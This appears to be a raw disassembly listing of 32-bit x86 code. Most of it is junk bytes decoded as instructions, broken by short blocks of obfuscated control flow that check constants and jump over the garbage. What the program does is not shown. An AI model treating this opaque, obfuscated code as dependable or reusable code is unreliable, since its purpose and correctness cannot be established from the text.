  4018f0:	or     eax,0x43d2d5f3
  4018f5:	stos   BYTE PTR es:[edi],al
  4018f6:	add    esi,DWORD PTR [edi-0x45bfa39]
  4018fc:	pop    ebx
  4018fd:	add    ebp,ebp
  4018ff:	hlt    
  401900:	hlt    
  401901:	cmp    esp,ecx
  401903:	inc    eax
  401904:	adc    esi,DWORD PTR [ebx-0x2b]
  401907:	and    ebx,DWORD PTR [eax]
  401909:	mov    dh,0x23
  40190b:	sub    ch,BYTE PTR [ecx+0x51409a2f]
  401911:	pop    edx
  401912:	icebp  
  401913:	sub    bl,BYTE PTR [edx+ebx*4-0x6f]
  401917:	push   0x58e5af5a
  40191c:	or     ecx,edx
  40191e:	shl    BYTE PTR [ecx+eax*1-0x3158dcd2],cl
  401925:	pop    ecx
  401926:	or     bh,BYTE PTR [esi]
  401928:	pop    DWORD PTR [edx-0x5aa7896c]
  40192e:	inc    ebx
  40192f:	sti    
  401930:	or     bh,BYTE PTR [ecx]
  401932:	jge    0x401989
  401934:	addr16 xchg edi,eax
  401936:	jg     0x4018dd
  401938:	int    0x81
  40193a:	and    BYTE PTR [ebp+0x19],ch
  40193d:	jecxz  0x4018e5
  40193f:	shr    DWORD PTR [ebx+0x6f],0xb2
  401943:	adc    eax,0xffffff93
  401946:	shl    BYTE PTR [edi+0x8],cl
  401949:	lahf   
  40194a:	dec    edx
  40194b:	or     ecx,DWORD PTR [ecx+0x458be445]
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x37bf628
  401994:	sub    esp,DWORD PTR ds:[eax+0x70707a70]
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	imul   edi,ebp,0x36
  4019a2:	call   0x5a2b:0x94619f
  4019a9:	mov    cl,0x60
  4019ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019ac:	add    bh,ah
  4019ae:	leave  
  4019af:	fucomi st,st(0)
  4019b1:	dec    ebx
  4019b2:	clc    
  4019b3:	mov    ds:0x9335fc9a,eax
  4019b8:	sub    cl,BYTE PTR [ecx-0x46]
  4019bb:	push   esp
  4019bc:	inc    ebp
  4019bd:	rcl    DWORD PTR [edx],cl
  4019bf:	inc    ebx
  4019c0:	mov    ds:0x9e664214,eax
  4019c5:	scas   eax,DWORD PTR es:[edi]
  4019c6:	lea    ebx,[esi+0x629a50ae]
  4019cc:	mov    eax,0xc56749d6
  4019d1:	out    dx,al
  4019d2:	or     ebp,DWORD PTR [edi]
  4019d4:	xchg   ecx,eax
  4019d5:	dec    ecx
  4019d6:	xchg   ebp,eax
  4019d7:	js     0x401a13
  4019d9:	lock outs dx,DWORD PTR ds:[esi]
  4019db:	inc    esp
  4019dc:	jmp    0xb8d9:0xfebb72d6
  4019e3:	out    dx,eax
  4019e4:	mov    ebx,0x4035e931
  4019e9:	mov    eax,0xa62ec709
  4019ee:	es stos DWORD PTR es:[edi],eax
  4019f0:	sbb    BYTE PTR [edi+0x44],cl
  4019f3:	retf   
  4019f4:	mov    edx,edx
  4019f6:	dec    edi
  4019f7:	scas   eax,DWORD PTR es:[edi]
  4019f8:	daa    
  4019f9:	aam    0x66
  4019fb:	mov    edx,DWORD PTR [ebx]
  4019fd:	and    BYTE PTR [edi],ch
  4019ff:	sbb    al,BYTE PTR [edx-0x5a0d70d3]
  401a05:	or     bh,cl
  401a07:	jne    0x401a3b
  401a09:	cmp    ch,ah
  401a0b:	sub    eax,0xeea58205
  401a10:	add    edi,eax
  401a12:	(bad)  
  401a13:	jmp    0xbf10:0x117051e1
  401a1a:	pop    ds
  401a1b:	xchg   edi,eax
  401a1c:	and    eax,0xbfb2024f
  401a21:	ins    BYTE PTR es:[edi],dx
  401a22:	push   ecx
  401a23:	rcr    DWORD PTR [edi+0x5777d9b7],cl
  401a29:	int    0x8f
  401a2b:	ret    0x982e
  401a2e:	aad    0xd9
  401a30:	ror    bl,1
  401a32:	or     dl,BYTE PTR [eax]
  401a34:	inc    ebx
  401a35:	sbb    al,0x77
  401a37:	pop    edi
  401a38:	pop    ss
  401a39:	mov    esp,0x87361aad
  401a3e:	ja     0x4019d4
  401a40:	(bad)  
  401a41:	nop
  401a42:	jmp    0x401aa0
  401a44:	aas    
  401a45:	ds sbb al,0xf0
  401a48:	push   0x4fb97a1a
  401a4d:	adc    al,0x2d
  401a4f:	pop    esp
  401a50:	mov    edx,0x4bf27fbb
  401a55:	popa   
  401a56:	gs push edx
  401a58:	shr    DWORD PTR [edx],1
  401a5a:	popa   
  401a5b:	push   0xffffffd4
  401a5d:	mov    eax,0xe47ffbd6
  401a62:	ja     0x401a59
  401a64:	xchg   ebp,eax
  401a65:	pop    edi
  401a66:	dec    eax
  401a67:	stc    
  401a68:	js     0x4019ff
  401a6a:	xchg   BYTE PTR [esi+0x5bed0c79],bh
  401a70:	dec    edi
  401a71:	jecxz  0x401a4e
  401a73:	xor    al,0x7f
  401a75:	(bad)  
  401a76:	dec    edi
  401a77:	lea    ebp,[edx+0x15]
  401a7a:	mov    DWORD PTR [edi+0x6c],esi
  401a7d:	add    BYTE PTR [edx-0x2a],ch
  401a80:	imul   ebp,DWORD PTR [ebx+edi*2+0x2c],0xd165100a
  401a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a89:	adc    al,BYTE PTR [eax-0x177c9c37]
  401a8f:	stc    
  401a90:	and    DWORD PTR [eax+ebp*1],esi
  401a93:	(bad)  
  401a94:	fidivr DWORD PTR [ebp-0x71078650]
  401a9a:	jb     0x401af1
  401a9c:	in     eax,dx
  401a9d:	sbb    eax,0xe0749791
  401aa2:	sbb    eax,0x98c25ef8
  401aa7:	cmp    eax,0x5d81926b
  401aac:	mov    ds:0xfec3c313,al
  401ab1:	mov    WORD PTR [esi+0x2fba27],cs
  401ab7:	and    al,0x8e
  401ab9:	stos   BYTE PTR es:[edi],al
  401aba:	mov    esp,0x9378bff3
  401abf:	pop    edi
  401ac0:	rcl    DWORD PTR [ebx-0xf],1
  401ac3:	sbb    eax,DWORD PTR [eax+0x2c]
  401ac6:	mov    dh,0x43
  401ac8:	mul    edi
  401aca:	mov    ecx,ebx
  401acc:	mov    al,ds:0x19777122
  401ad1:	pop    es
  401ad2:	in     al,dx
  401ad3:	sub    eax,0x78ce278f
  401ad8:	push   edi
  401ad9:	push   esp
  401ada:	cmp    eax,0xc839fda6
  401adf:	or     dh,BYTE PTR [eax-0x18]
  401ae2:	mov    esp,edx
  401ae4:	mov    edx,0xa5a304ce
  401ae9:	adc    eax,0x6c89294d
  401aee:	in     eax,dx
  401aef:	sub    DWORD PTR [eax],0x2f1a4a53
  401af5:	cmp    al,bl
  401af7:	sahf   
  401af8:	rcl    DWORD PTR [edx+edx*1-0x26],cl
  401afc:	mov    dh,0x9b
  401afe:	pop    ds
  401aff:	cmovne esp,ebx
  401b02:	or     edi,ecx
  401b04:	and    ebp,ecx
  401b06:	and    ebx,DWORD PTR [esi-0x7f3fbb03]
  401b0c:	mov    bl,0xde
  401b0e:	outs   dx,DWORD PTR ds:[esi]
  401b0f:	jecxz  0x401a9e
  401b11:	dec    edx
  401b12:	add    DWORD PTR [eax+0xd0f6d21],ebp
  401b18:	add    BYTE PTR [edi-0x66729274],dl
  401b1e:	pusha  
  401b1f:	dec    eax
  401b20:	nop
  401b21:	jge    0x401b51
  401b23:	push   0x45
  401b25:	jmp    0x401b90
  401b27:	arpl   WORD PTR [eax],ax
  401b29:	pop    es
  401b2a:	add    BYTE PTR [eax+0x3f2643],cl
  401b30:	out    dx,al
  401b31:	fsub   DWORD PTR [eax]
  401b33:	cwde   
  401b34:	mov    DWORD PTR [ecx],edx
  401b36:	es mov edx,0xc1d60efb
  401b3c:	mov    ebx,DWORD PTR [eax-0x37cf1c88]
  401b42:	mov    ebp,0x86e721c4
  401b47:	dec    edi
  401b48:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b4a:	mov    cl,0x1c
  401b4c:	sbb    al,BYTE PTR [edi]
  401b4e:	push   edi
  401b4f:	aam    0x4c
  401b51:	imul   edi,DWORD PTR [ebp+0x57de109e],0x489fb05c
  401b5b:	scas   eax,DWORD PTR es:[edi]
  401b5c:	cmc    
  401b5d:	fbld   TBYTE PTR [ebp+esi*4+0x68fe6257]
  401b64:	or     ecx,ebx
  401b66:	add    eax,0xd2b4c007
  401b6b:	in     eax,dx
  401b6c:	and    bh,BYTE PTR [ebx+0x7841e857]
  401b72:	into   
  401b73:	cmp    DWORD PTR [edx],0x606ca116
  401b79:	and    eax,0x8d14b1ac
  401b7e:	xchg   edi,eax
  401b7f:	push   ss
  401b80:	jno    0x401b9c
  401b82:	jbe    0x401bb7
  401b84:	push   ebx
  401b85:	stc    
  401b86:	nop
  401b87:	jl     0x401bc0
  401b89:	int    0x52
  401b8b:	mov    ebx,0x2e6485e8
  401b90:	(bad)  [ebx+0xd]
  401b93:	push   edi
  401b94:	jmp    0xcc3ca897
  401b99:	ds ret 0x39a9
  401b9d:	icebp  
  401b9e:	daa    
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    bl,al
  401bdd:	add    edx,edx
  401bdf:	stos   BYTE PTR es:[edi],al
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	xchg   ebx,eax
  401be9:	cwde   
  401bea:	and    esi,DWORD PTR [esi+0x16]
  401bed:	and    ah,dh
  401bef:	dec    esp
  401bf0:	adc    dh,BYTE PTR [eax+0x4d]
  401bf3:	in     eax,0xf
  401bf5:	xchg   edx,eax
  401bf6:	cdq    
  401bf7:	xor    DWORD PTR [ecx],0x34
  401bfa:	(bad)  
  401bfb:	es push edi
  401bfd:	dec    ecx
  401bfe:	sub    DWORD PTR [ecx+0x6409edce],0x4f6181a8
  401c08:	lods   eax,DWORD PTR ds:[esi]
  401c09:	data16 mov al,ds:0x2c4ff51f
  401c0f:	arpl   WORD PTR ds:0x36d7a7d6,di
  401c15:	fsubrp st(7),st
  401c17:	enter  0xd497,0xe5
  401c1b:	outs   dx,DWORD PTR ds:[esi]
  401c1c:	push   ebx
  401c1d:	cli    
  401c1e:	mov    DWORD PTR ds:0x1275751a,ebp
  401c24:	sbb    al,BYTE PTR [ebp+0x451d1e62]
  401c2a:	adc    eax,DWORD PTR [ebp+0xf]
  401c2d:	in     eax,0x7f
  401c2f:	stos   BYTE PTR es:[edi],al
  401c30:	outs   dx,DWORD PTR ds:[esi]
  401c31:	imul   edi,DWORD PTR [ecx+0x61],0xd5536f57
  401c38:	repz jne 0x401c0e
  401c3b:	inc    edi
  401c3c:	ins    DWORD PTR es:[edi],dx
  401c3d:	int3   
  401c3e:	aam    0x21
  401c40:	mov    bl,bh
  401c42:	cld    
  401c43:	nop
  401c44:	je     0x401c0f
  401c46:	dec    ebx
  401c47:	pop    ds
  401c48:	out    dx,eax
  401c49:	lods   al,BYTE PTR ds:[esi]
  401c4a:	push   ss
  401c4b:	mov    cl,0xa5
  401c4d:	out    0x96,eax
  401c4f:	rcl    dl,1
  401c51:	xchg   esp,eax
  401c52:	out    0x62,eax
  401c54:	pop    DWORD PTR [ebp+eiz*1-0x3d]
  401c58:	ror    al,cl
  401c5a:	(bad)  
  401c5b:	out    0x32,eax
  401c5d:	jae    0x401cb7
  401c5f:	push   0xfffffff4
  401c61:	jmp    0x401ce1
  401c63:	mov    bh,0x5c
  401c65:	outs   dx,BYTE PTR ds:[esi]
  401c66:	mov    ah,0x9a
  401c68:	shl    BYTE PTR [ebp+0x3e],cl
  401c6b:	in     eax,dx
  401c6c:	adc    BYTE PTR [edx],dl
  401c6e:	fimul  WORD PTR [esi]
  401c70:	rcl    bh,cl
  401c72:	inc    edi
  401c73:	into   
  401c74:	aad    0xaa
  401c76:	js     0x401c84
  401c78:	inc    ebp
  401c79:	leave  
  401c7a:	mov    dh,0x3e
  401c7c:	mov    ch,0xc4
  401c7e:	jle    0xa207d393
  401c84:	(bad)  
  401c85:	mov    ebp,0x9e7d22c8
  401c8a:	push   0x7863ec03
  401c8f:	arpl   bp,dx
  401c91:	inc    bh
  401c93:	aam    0x95
  401c95:	pop    ebp
  401c96:	inc    eax
  401c97:	dec    ebp
  401c98:	aas    
  401c99:	mov    al,ds:0x2543e502
  401c9e:	mov    ebx,0x63ac9028
  401ca3:	fbld   TBYTE PTR [ebx]
  401ca5:	stos   DWORD PTR es:[edi],eax
  401ca6:	mov    ds:0x6e02ac43,al
  401cab:	sub    BYTE PTR [ebx+ebp*4],0x88
  401caf:	xchg   ebx,eax
  401cb0:	sub    BYTE PTR [edi],ch
  401cb2:	or     DWORD PTR [edx+0x3f],0x33bd28a9
  401cb9:	imul   esi,DWORD PTR [ebx-0x23],0x2
  401cbd:	pop    ss
  401cbe:	imul   edx,DWORD PTR [eax+ebp*1],0xffffffca
  401cc2:	daa    
  401cc3:	rcr    DWORD PTR [ecx-0x2775f6c7],0x84
  401cca:	loopne 0x401c4d
  401ccc:	mov    ds:0xd2a0b2b4,al
  401cd1:	aas    
  401cd2:	push   ds
  401cd3:	push   esp
  401cd4:	sub    al,0x8
  401cd6:	sub    al,BYTE PTR [esi+edx*2-0x4d9f34f3]
  401cdd:	pop    ebx
  401cde:	std    
  401cdf:	adc    ebx,ebx
  401ce1:	std    
  401ce2:	ret    0x8d15
  401ce5:	outs   dx,DWORD PTR ds:[esi]
  401ce6:	inc    ebp
  401ce7:	push   ebp
  401ce8:	fild   WORD PTR [esi+ecx*2]
  401ceb:	mov    ecx,0xa390ea43
  401cf0:	or     BYTE PTR [esi-0x54],0xf7
  401cf4:	js     0x401c96
  401cf6:	into   
  401cf7:	icebp  
  401cf8:	bnd jbe 0x401d6a
  401cfb:	rol    DWORD PTR [edi+0x3b42642e],0xe5
  401d02:	repz sub BYTE PTR [eax],0x74
  401d06:	mov    ds:0xbfe9f7f8,eax
  401d0b:	cmp    al,BYTE PTR [edi+0xd4601f8]
  401d11:	adc    al,0x90
  401d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d14:	fcom   DWORD PTR [eax+0x1d]
  401d17:	outs   dx,BYTE PTR ds:[esi]
  401d18:	bts    DWORD PTR [ecx+0x2500dcaf],ebp
  401d1f:	add    eax,0xf87ea58b
  401d24:	imul   esi,DWORD PTR [ebp+0x43c3323c],0x56
  401d2b:	in     al,dx
  401d2c:	jmp    0x15c96694
  401d31:	pop    esp
  401d32:	mov    al,0x60
  401d34:	xor    eax,0x3a51d216
  401d39:	loop   0x401d8d
  401d3b:	sbb    BYTE PTR [eax+0x28f9f33d],ah
  401d41:	enter  0xa15d,0x8a
  401d45:	fwait
  401d46:	xchg   BYTE PTR [eax-0x6a],ch
  401d49:	ror    DWORD PTR [edx+0x6577b74d],cl
  401d4f:	jl     0x401d67
  401d51:	lahf   
  401d52:	data16 cmp ch,BYTE PTR [edi+0x68057654]
  401d59:	inc    ebp
  401d5a:	pusha  
  401d5b:	xchg   ebx,eax
  401d5c:	mov    edi,0x55c951f8
  401d61:	sub    al,bl
  401d63:	outs   dx,BYTE PTR ds:[esi]
  401d64:	jae    0x401d07
  401d66:	out    0xf0,eax
  401d68:	fstp   TBYTE PTR [eax]
  401d6a:	pop    edi
  401d6b:	ja     0x401d73
  401d6d:	icebp  
  401d6e:	inc    ecx
  401d6f:	adc    edx,ebx
  401d71:	push   ss
  401d72:	jno    0x401d1a
  401d74:	inc    ecx
  401d75:	push   ss
  401d76:	shl    BYTE PTR [edx-0x5b],1
  401d79:	mov    edx,0x49ccc14d
  401d7e:	daa    
  401d7f:	adc    eax,0x8e6854b8
  401d84:	xor    edx,0xc
  401d87:	das    
  401d88:	jae    0x401d70
  401d8a:	mov    ds:0xd21d1ee,eax
  401d8f:	sbb    eax,0xa2274133
  401d94:	hlt    
  401d95:	xchg   DWORD PTR [bx+si-0x23],edi
  401d99:	jge    0x401de9
  401d9b:	cmp    BYTE PTR [esi+0x58],bh
  401d9e:	mov    BYTE PTR [edx],ah
  401da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401da1:	test   eax,0xfa13959f
  401da6:	cmp    eax,0x962c90
  401dab:	gs push ebx
  401dad:	mov    DWORD PTR [eax],edx
  401daf:	push   edi
  401db0:	mov    esi,0xc30f7a2f
  401db5:	push   ds
  401db6:	pop    es
  401db7:	fwait
  401db8:	dec    edx
  401db9:	cdq    
  401dba:	jno    0x401d6d
  401dbc:	stos   DWORD PTR es:[edi],eax
  401dbd:	xchg   esp,eax
  401dbe:	xor    esi,DWORD PTR [esi+ebp*2]
  401dc1:	and    dh,al
  401dc3:	test   BYTE PTR [ecx-0x31],bh
  401dc6:	mov    al,ds:0x7f3c8740
  401dcb:	mov    ebp,0xf8b4ef56
  401dd0:	mov    ss,WORD PTR [ebp+0x20108036]
  401dd6:	mov    dl,BYTE PTR [edi+0x64ef2820]
  401ddc:	push   cs
  401ddd:	adc    eax,0x6cbaa027
  401de2:	add    ebx,edx
  401de4:	or     BYTE PTR [esi-0x63],dh
  401de7:	add    ax,WORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebp+edi*2-0x62],dl
  401e44:	ds sahf 
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	cmp    dl,BYTE PTR [eax+edi*2+0x9d72923]
  401e55:	stos   DWORD PTR es:[edi],eax
  401e56:	push   ebx
  401e57:	loop   0x401e3c
  401e59:	sbb    DWORD PTR ds:0x61364a96,edx
  401e5f:	fstp   DWORD PTR [eax-0x2c721814]
  401e65:	jmp    0xfeb2:0x6f13ddd1
  401e6c:	ins    DWORD PTR es:[edi],dx
  401e6d:	sub    DWORD PTR [ecx],ebx
  401e6f:	cwde   
  401e70:	in     eax,dx
  401e71:	repnz enter 0x6dbd,0xb9
  401e76:	inc    ecx
  401e77:	jl     0x401e41
  401e79:	mov    ebp,0x2a75f9d5
  401e7e:	inc    edx
  401e7f:	cmp    BYTE PTR [esi+0x400820c7],ah
  401e85:	ffree  st(1)
  401e87:	push   ss
  401e88:	pop    ss
  401e89:	loopne 0x401e1e
  401e8b:	xchg   BYTE PTR [esi-0x55450fad],bl
  401e91:	sub    eax,0x7dab7633
  401e96:	push   cs
  401e97:	aaa    
  401e98:	jg     0x401ed0
  401e9a:	add    eax,0x6dac5da5
  401e9f:	mov    ebx,0x88401dc0
  401ea4:	push   ds
  401ea5:	hlt    
  401ea6:	(bad)  
  401ea7:	xchg   ebp,eax
  401ea8:	sbb    eax,0x868a4659
  401ead:	push   esp
  401eae:	es aad 0xfe
  401eb1:	pop    esi
  401eb2:	sub    BYTE PTR [ebx-0x37],bl
  401eb5:	out    0x49,eax
  401eb7:	add    dl,ah
  401eb9:	mov    ebx,DWORD PTR [ebx+0x6e9eccbf]
  401ebf:	fimul  DWORD PTR [edi]
  401ec1:	icebp  
  401ec2:	dec    ebx
  401ec3:	lahf   
  401ec4:	int3   
  401ec5:	loope  0x401eb6
  401ec7:	sbb    eax,0x31cf5949
  401ecc:	and    al,0xcf
  401ece:	retf   
  401ecf:	add    dh,0xe6
  401ed2:	lock std 
  401ed4:	mov    ah,0xd0
  401ed6:	mov    esp,0x10b12e7d
  401edb:	test   dh,ch
  401edd:	mov    fs,edx
  401edf:	pop    esp
  401ee0:	test   BYTE PTR [ebp-0x62],bh
  401ee3:	lahf   
  401ee4:	jl     0x401e95
  401ee6:	test   esp,esp
  401ee8:	xlat   BYTE PTR ds:[ebx]
  401ee9:	(bad)  
  401eea:	adc    al,BYTE PTR [ebp+0x6]
  401eed:	mov    dl,BYTE PTR [edi-0x34cbfdaa]
  401ef3:	popf   
  401ef4:	adc    eax,0x7dd1f146
  401ef9:	pop    edi
  401efa:	mov    eax,0xd0953b81
  401eff:	call   0x39537f99
  401f04:	jge    0x401f13
  401f06:	jge    0x401f84
  401f08:	sbb    al,0xde
  401f0a:	imul   ebp,DWORD PTR [ebx],0xffffff91
  401f0d:	popf   
  401f0e:	pop    edi
  401f0f:	cld    
  401f10:	or     al,0x3
  401f12:	pop    eax
  401f13:	std    
  401f14:	push   0xffffff94
  401f16:	pop    esp
  401f17:	cli    
  401f18:	sub    eax,0x7c6ba5c
  401f1d:	mov    ?,WORD PTR [ebp+0xa6f1e3d]
  401f23:	sbb    al,0x9a
  401f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f26:	je     0x401ed1
  401f28:	les    esp,FWORD PTR [edi+edx*8-0x29]
  401f2c:	not    ebp
  401f2e:	in     al,0xfa
  401f30:	xor    al,0x21
  401f32:	fidiv  WORD PTR [edi+0x2c]
  401f35:	and    al,0x40
  401f37:	cwde   
  401f38:	rcr    DWORD PTR [ecx+ebp*4],cl
  401f3b:	int    0xc7
  401f3d:	inc    ebp
  401f3e:	and    eax,0x74ebcf8
  401f43:	shr    esp,0x7a
  401f46:	push   ebp
  401f47:	icebp  
  401f48:	xchg   ebp,eax
  401f49:	scas   eax,DWORD PTR es:[edi]
  401f4a:	add    eax,0x26d90736
  401f4f:	sbb    edi,esi
  401f51:	sub    ebp,DWORD PTR [esp-0x67]
  401f55:	sbb    ebx,DWORD PTR [edx-0x401219e9]
  401f5b:	mov    edi,0xc5edfac4
  401f60:	scas   eax,DWORD PTR es:[edi]
  401f61:	je     0x401f45
  401f63:	push   ebx
  401f64:	call   0xebd3:0x54f877f1
  401f6b:	lds    esp,FWORD PTR [ecx+0x42]
  401f6e:	xchg   esi,eax
  401f6f:	mov    bh,cl
  401f71:	pop    ss
  401f72:	pushf  
  401f73:	aas    
  401f74:	add    al,0xd9
  401f76:	jmp    0x401f80
  401f78:	into   
  401f79:	stos   DWORD PTR es:[edi],eax
  401f7a:	int3   
  401f7b:	dec    ecx
  401f7c:	xchg   edi,eax
  401f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f7e:	(bad)  
  401f7f:	mov    eax,0x56f97190
  401f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f85:	mov    ds:0x97a529cd,al
  401f8a:	call   0xb3fa:0x749ed723
  401f91:	inc    eax
  401f92:	mov    ecx,0xbb6afbf6
  401f97:	(bad)  
  401f99:	imul   ebx,ebp,0x6ff67234
  401f9f:	je     0x402004
  401fa1:	call   0xf3de:0xeb81653c
  401fa8:	jo     0x401f84
  401faa:	js     0x401f69
  401fac:	cmc    
  401fad:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401faf:	cwde   
  401fb0:	xchg   edi,eax
  401fb1:	dec    bl
  401fb3:	pushf  
  401fb4:	xor    al,0x5e
  401fb6:	js     0x402028
  401fb8:	xchg   edi,eax
  401fb9:	mov    bl,0x2c
  401fbb:	scas   al,BYTE PTR es:[edi]
  401fbc:	xor    bh,BYTE PTR [eax-0x3d]
  401fbf:	aas    
  401fc0:	fsub   QWORD PTR [ebx+0x6a]
  401fc3:	add    dh,cl
  401fc5:	sub    BYTE PTR [edi],bh
  401fc7:	mov    bh,0xc0
  401fc9:	mov    edx,0xf3268c
  401fce:	lods   eax,DWORD PTR ds:[esi]
  401fcf:	std    
  401fd0:	aas    
  401fd1:	in     al,dx
  401fd2:	gs arpl cx,dx
  401fd5:	(bad)  
  401fd6:	out    0xe7,eax
  401fd8:	xor    eax,0x17a96965
  401fde:	push   ss
  401fdf:	adc    esi,edx
  401fe1:	fadd   DWORD PTR [ebx]
  401fe3:	dec    ebx
  401fe4:	mov    esp,0xa28921bb
  401fe9:	jle    0x401fff
  401feb:	inc    ecx
  401fec:	std    
  401fed:	pop    ecx
  401fee:	adc    DWORD PTR [edx],ecx
  401ff0:	jge    0x401ff6
  401ff2:	mov    ecx,0x41f2afca
  401ff7:	xchg   esi,eax
  401ff8:	mov    DWORD PTR [edx],edx
  401ffa:	mov    WORD PTR [esi-0x698c5d4c],?
  402000:	add    dh,BYTE PTR [ebx+0x79b9b173]
  402006:	ret    0x21a4
  402009:	cmp    dh,ah
  40200b:	lods   al,BYTE PTR ds:[esi]
  40200c:	inc    edi
  40200d:	je     0x40204c
  40200f:	dec    ebp
  402010:	ret    
  402011:	rcl    BYTE PTR [eax+esi*2+0x26],1
  402015:	adc    al,BYTE PTR [ebx]
  402017:	cmp    eax,0x6334db65
  40201c:	enter  0x2b18,0x16
  402020:	inc    eax
  402021:	adc    eax,0x85daa70d
  402026:	push   0xab0ee8f
  40202b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40202c:	nop
  40202d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40202e:	pop    ebp
  40202f:	out    0xb9,eax
  402031:	out    dx,al
  402032:	rcl    DWORD PTR [ebx],cl
  402034:	call   0xc33062c1
  402039:	sbb    BYTE PTR [ecx],ah
  40203b:	push   edi
  40203c:	adc    esi,DWORD PTR [eax]
  40203e:	shl    bl,1
  402040:	std    
  402041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402042:	add    al,0x66
  402044:	ins    BYTE PTR es:[edi],dx
  402045:	mov    ebp,esi
  402047:	xchg   ecx,eax
  402048:	pop    ecx
  402049:	inc    edi
  40204a:	cmp    DWORD PTR [eax],0x67
  40204d:	ins    BYTE PTR es:[edi],dx
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	xor    BYTE PTR [edi+ebx*2],0xeb
  40206d:	pop    edx
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	hlt    
  402077:	mov    ?,WORD PTR [edi-0x63]
  40207a:	mov    edx,0x24008aa1
  40207f:	and    BYTE PTR [ebp-0xd],dh
  402082:	addr16 and eax,0x9b92ddde
  402088:	(bad)  
  402089:	jb     0x40207d
  40208b:	inc    ebx
  40208c:	mov    al,0x8
  40208e:	daa    
  40208f:	mov    eax,es
  402091:	jb     0x402049
  402093:	and    eax,0xec6ca6e2
  402098:	mov    esp,ecx
  40209a:	pusha  
  40209b:	and    bl,ch
  40209d:	jbe    0x40208c
  40209f:	adc    BYTE PTR [eax-0x2638150a],cl
  4020a5:	adc    cl,BYTE PTR [ecx]
  4020a7:	retf   0x984
  4020aa:	imul   ecx,ebp,0x15
  4020ad:	test   BYTE PTR [esi+0x66],ch
  4020b0:	div    DWORD PTR [ebx]
  4020b2:	jae    0x40207d
  4020b4:	cwde   
  4020b5:	sti    
  4020b6:	data16 fwait
  4020b8:	mov    cl,0xbb
  4020ba:	addr16 or ebp,edx
  4020bd:	test   DWORD PTR [esi-0x6c],eax
  4020c0:	clc    
  4020c1:	inc    esp
  4020c2:	cmp    DWORD PTR [edi-0x4c],esi
  4020c5:	sub    eax,DWORD PTR [ebp-0x6d]
  4020c8:	mov    edx,0xb9eb393c
  4020cd:	and    BYTE PTR [ebx],dh
  4020cf:	ret    0xd27f
  4020d2:	add    esi,eax
  4020d4:	cdq    
  4020d5:	mov    ch,0x47
  4020d7:	dec    ebp
